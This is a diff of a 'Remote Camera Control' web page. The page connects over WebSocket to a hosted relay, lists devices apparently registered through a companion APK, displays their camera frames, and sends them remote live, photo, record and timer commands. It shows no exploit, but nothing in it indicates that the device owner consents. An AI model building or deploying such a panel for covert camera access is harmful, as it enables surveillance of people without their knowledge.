@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Live Camera Stream</title>
+    <title>Remote Camera Control</title>
     <style>
         * {
             margin: 0;
@@ -18,23 +18,502 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
         }
 
         .container {
-            max-width: 800px;
+            max-width: 500px;
             width: 100%;
-            background: #1a1a2e;
-            border-radius: 20px;
+            background: #111;
+            border-radius: 24px;
             overflow: hidden;
             box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            border: 1px solid rgba(68,255,68,0.3);
         }
 
+        /* Header */
         .header {
-            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            background: #1a1a1a;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .tools {
+            display: flex;
+            gap: 16px;
+        }
+
+        .tools span {
+            color: #888;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .tools span:hover {
+            color: #fff;
+        }
+
+        /* Device Info */
+        .device-info {
+            background: #0f0f0f;
+            padding: 16px 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        .device-name {
+            color: #00ff00;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .device-id {
+            color: #666;
+            font-size: 12px;
+            font-family: monospace;
+        }
+
+        .remote-status {
+            color: #00ff00;
+            font-size: 12px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff00;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Video Section */
+        .video-section {
+            background: #000;
             padding: 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        .video-container {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            aspect-ratio: 16/9;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #0a0a0a;
+            color: #666;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Quality Buttons */
+        .quality-section {
+            padding: 16px 20px;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .quality-label {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .quality-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .quality-btn {
+            background: #222;
+            border: none;
+            color: #888;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .quality-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+
+        /* Control Buttons */
+        .controls {
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        .control-btn {
+            background: #222;
+            border: none;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .control-btn.live {
+            background: #ff4444;
+        }
+
+        .control-btn.photo {
+            background: #4CAF50;
+        }
+
+        .control-btn.rec {
+            background: #ff9800;
+        }
+
+        .control-btn:hover {
+            transform: scale(1.02);
+            opacity: 0.9;
+        }
+
+        /* Timer Section */
+        .timer-section {
+            padding: 16px 20px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        .timer-btn {
+            background: #222;
+            border: none;
+            color: #888;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .timer-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+
+        /* Bottom Nav */
+        .bottom-nav {
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-around;
+            background: #1a1a1a;
+        }
+
+        .nav-item {
+            color: #666;
             text-align: center;
+            cursor: pointer;
+        }
+
+        .nav-item.active {
+            color: #00ff00;
+        }
+
+        .nav-icon {
+            font-size: 20px;
+            margin-bottom: 4px;
+        }
+
+        .nav-label {
+            font-size: 10px;
+        }
+
+        /* Logout */
+        .logout {
+            background: #1a1a1a;
+            padding: 16px 20px;
+            text-align: center;
+            border-top: 1px solid #333;
+        }
+
+        .logout-btn {
+            background: none;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            padding: 10px;
+            width: 100%;
+            border-radius: 30px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">Remote Control</div>
+        <div class="tools">
+            <span>🔧</span>
+            <span>📱</span>
+            <span>⚡</span>
+            <span>🚪</span>
+        </div>
+    </div>
+
+    <!-- Device Info -->
+    <div class="device-info">
+        <div class="device-name">Connected to: <span id="deviceName">--</span></div>
+        <div class="device-id" id="deviceId">Device ID: --</div>
+        <div class="remote-status">
+            <div class="status-dot"></div>
+            <span>Ready</span>
+        </div>
+    </div>
+
+    <!-- Video Section -->
+    <div class="video-section">
+        <div class="video-container">
+            <video id="liveStream" autoplay muted playsinline></video>
+            <div id="placeholder" class="placeholder">
+                <div>📷</div>
+                <div>Waiting for stream...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Quality Buttons -->
+    <div class="quality-section">
+        <span class="quality-label">Quality</span>
+        <div class="quality-buttons">
+            <button class="quality-btn" data-quality="144">144p</button>
+            <button class="quality-btn active" data-quality="240">240p</button>
+            <button class="quality-btn" data-quality="360">360p</button>
+            <button class="quality-btn" data-quality="480">480p</button>
+        </div>
+    </div>
+
+    <!-- Control Buttons -->
+    <div class="controls">
+        <button class="control-btn live" id="btnLive">🔴 Live</button>
+        <button class="control-btn photo" id="btnPhoto">📸 Photo</button>
+        <button class="control-btn rec" id="btnRec">⏺ Rec</button>
+    </div>
+
+    <!-- Timer Section -->
+    <div class="timer-section">
+        <button class="timer-btn" data-timer="1">1m</button>
+        <button class="timer-btn" data-timer="2">2m</button>
+        <button class="timer-btn" data-timer="5">5m</button>
+    </div>
+
+    <!-- Bottom Nav -->
+    <div class="bottom-nav">
+        <div class="nav-item active">
+            <div class="nav-icon">📷</div>
+            <div class="nav-label">Live</div>
+        </div>
+        <div class="nav-item">
+            <div class="nav-icon">🖼️</div>
+            <div class="nav-label">Photo</div>
+        </div>
+        <div class="nav-item">
+            <div class="nav-icon">⏺️</div>
+            <div class="nav-label">Rec</div>
+        </div>
+    </div>
+
+    <!-- Logout -->
+    <div class="logout">
+        <button class="logout-btn" id="btnLogout">BACK</button>
+    </div>
+</div>
+
+<script>
+    // 🔴🔴🔴 RENDER URL - APK KE HISAB SE 🔴🔴🔴
+    const RENDER_URL = "wss://server-1-lkze.onrender.com";
+    
+    let socket = null;
+    let videoElement = document.getElementById('liveStream');
+    let placeholder = document.getElementById('placeholder');
+    let currentCameraId = null;
+    let activeCameras = [];
+    let isStreaming = false;
+    let currentQuality = "240";
+
+    function connectToRender() {
+        const viewerId = 'viewer_' + Math.random().toString(36).substr(2, 9);
+        const wsUrl = `${RENDER_URL}?type=viewer&id=${viewerId}`;
+        
+        try {
+            socket = new WebSocket(wsUrl);
+            
+            socket.onopen = () => {
+                console.log('✅ Connected');
+                document.querySelector('.remote-status span').innerHTML = 'Ready';
+            };
+            
+            socket.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    
+                    if (data.type === 'cameraList') {
+                        activeCameras = data.cameras || [];
+                        
+                        if (activeCameras.length > 0) {
+                            const device = activeCameras[0];
+                            currentCameraId = device.id;
+                            document.getElementById('deviceName').innerHTML = device.name || device.id.substring(0, 8);
+                            document.getElementById('deviceId').innerHTML = `Device ID: ${device.id.substring(0, 8)}`;
+                            
+                            socket.send(JSON.stringify({
+                                type: 'watch',
+                                cameraId: currentCameraId,
+                                quality: currentQuality
+                            }));
+                        } else {
+                            document.getElementById('deviceName').innerHTML = 'No device';
+                            document.getElementById('deviceId').innerHTML = 'Device ID: --';
+                        }
+                    }
+                    
+                    if (data.type === 'frame') {
+                        placeholder.classList.add('hidden');
+                        videoElement.style.display = 'block';
+                        videoElement.src = `data:image/jpeg;base64,${data.frame}`;
+                    }
+                    
+                } catch (e) {
+                    if (event.data instanceof Blob) {
+                        placeholder.classList.add('hidden');
+                        videoElement.style.display = 'block';
+                        const url = URL.createObjectURL(event.data);
+                        videoElement.src = url;
+                    }
+                }
+            };
+            
+            socket.onclose = () => {
+                console.log('Disconnected, reconnecting...');
+                document.querySelector('.remote-status span').innerHTML = 'Disconnected';
+                setTimeout(connectToRender, 5000);
+            };
+            
+        } catch(e) {
+            setTimeout(connectToRender, 10000);
+        }
+    }
+    
+    // Quality buttons
+    document.querySelectorAll('.quality-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentQuality = btn.getAttribute('data-quality');
+            
+            if (socket && socket.readyState === WebSocket.OPEN && currentCameraId) {
+                socket.send(JSON.stringify({
+                    type: 'setQuality',
+                    cameraId: currentCameraId,
+                    quality: currentQuality
+                }));
+            }
+        });
+    });
+    
+    // Control buttons
+    document.getElementById('btnLive').addEventListener('click', () => {
+        if (socket && socket.readyState === WebSocket.OPEN && currentCameraId) {
+            socket.send(JSON.stringify({ type: 'action', action: 'live', cameraId: currentCameraId }));
+        }
+    });
+    
+    document.getElementById('btnPhoto').addEventListener('click', () => {
+        if (socket && socket.readyState === WebSocket.OPEN && currentCameraId) {
+            socket.send(JSON.stringify({ type: 'action', action: 'photo', cameraId: currentCameraId }));
+        }
+    });
+    
+    document.getElementById('btnRec').addEventListener('click', () => {
+        if (socket && socket.readyState === WebSocket.OPEN && currentCameraId) {
+            socket.send(JSON.stringify({ type: 'action', action: 'record', cameraId: currentCameraId }));
+        }
+    });
+    
+    document.getElementById('btnLogout').addEventListener('click', () => {
+        if (socket) socket.close();
+        location.reload();
+    });
+    
+    // Timer buttons
+    document.querySelectorAll('.timer-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const timer = btn.getAttribute('data-timer');
+            if (socket && socket.readyState === WebSocket.OPEN && currentCameraId) {
+                socket.send(JSON.stringify({ type: 'timer', timer: timer, cameraId: currentCameraId }));
+            }
+        });
+    });
+    
+    // Bottom nav
+    document.querySelectorAll('.nav-item').forEach((item, index) => {
+        item.addEventListener('click', () => {
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+            item.classList.add('active');
+            if (index === 0) document.getElementById('btnLive').click();
+            if (index === 1) document.getElementById('btnPhoto').click();
+            if (index === 2) document.getElementById('btnRec').click();
+        });
+    });
+    
+    // Start connection
+    connectToRender();
+</script>
+
+</body>
+</html>            text-align: center;
         }
 
         .header h1 {
